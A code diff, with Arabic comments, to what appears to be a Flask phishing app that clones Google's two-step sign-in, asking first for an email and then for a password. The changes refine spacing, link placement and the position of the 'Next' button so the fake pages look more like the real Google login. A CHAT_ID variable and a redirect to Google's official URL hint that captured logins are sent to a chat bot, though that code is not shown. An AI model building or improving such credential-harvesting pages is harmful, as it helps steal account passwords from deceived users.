@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: تجميع وترتيب العناصر بسلاسة دون فراغات مزعجة
+# الصفحة الأولى: المسافات مفصولة وموزعة بدقة بين الروابط وزر التالي السفلي
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -51,7 +51,8 @@ def step1():
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            padding: 24px 16px;
+            justify-content: space-between;
+            padding: 24px 16px 20px 16px;
         }
         
         .login-card {
@@ -107,32 +108,46 @@ def step1():
         }
         .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
-        .links-wrapper {
+        /* رابط هل نسيت البريد قريبه للحقل */
+        .forgot-link-wrapper {
             width: 100%;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            justify-content: flex-start;
             margin-top: 8px;
             padding: 0 2px;
         }
-
-        .links-wrapper a {
+        .forgot-link-wrapper a {
             color: #1a73e8;
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
         }
-        .links-wrapper a:hover { text-decoration: underline; }
+        .forgot-link-wrapper a:hover { text-decoration: underline; }
 
-        /* منطقة الأزرار السفلية مرتبة ومتصلة طبيعياً داخل الكارد */
+        /* فصل "إنشاء حساب" بمسافة ممتازة للأسفل عن رابط نسيت البريد */
+        .signup-link-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: flex-start;
+            margin-top: 24px;
+            padding: 0 2px;
+        }
+        .signup-link-wrapper a {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .signup-link-wrapper a:hover { text-decoration: underline; }
+
+        /* حاوية زر التالي في الزاوية السفلى تماماً وبوضوح */
         .footer-action {
             width: 100%;
             max-width: 400px;
             display: flex;
-            justify-content: space-between;
+            justify-content: flex-end;
             align-items: center;
-            margin-top: 36px;
-            padding: 0 2px;
+            padding-bottom: 4px;
         }
 
         .submit-btn {
@@ -171,15 +186,18 @@ def step1():
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
             </div>
             
-            <div class="links-wrapper">
+            <div class="forgot-link-wrapper">
                 <a href="#">هل نسيت بريدك الإلكتروني؟</a>
             </div>
-        </form>
 
-        <div class="footer-action">
-            <a href="https://accounts.google.com/signup" target="_blank" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">إنشاء حساب</a>
-            <button type="submit" form="emailForm" class="submit-btn">التالي</button>
-        </div>
+            <div class="signup-link-wrapper">
+                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer-action">
+        <button type="submit" form="emailForm" class="submit-btn">التالي</button>
     </div>
 </body>
 </html>
@@ -233,7 +251,8 @@ def step2():
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            padding: 24px 16px;
+            justify-content: space-between;
+            padding: 24px 16px 20px 16px;
         }
         
         .login-card {
@@ -311,8 +330,7 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            margin-top: 36px;
-            padding: 0 2px;
+            padding-bottom: 4px;
         }
 
         .submit-btn {
@@ -345,7 +363,7 @@ def step2():
         </div>
 
         {% if error %}
-            <div class="error-msg">{{ error }}`</div>
+            <div class="error-msg">{{ error }}</div>
         {% endif %}
 
         <form id="passForm" method="POST" style="width: 100%;">
@@ -353,10 +371,10 @@ def step2():
                 <input type="password" name="password" required placeholder="إدخال كلمة المرور">
             </div>
         </form>
+    </div>
 
-        <div class="footer-action">
-            <button type="submit" form="passForm" class="submit-btn">التالي</button>
-        </div>
+    <div class="footer-action">
+        <button type="submit" form="passForm" class="submit-btn">التالي</button>
     </div>
 </body>
 </html>
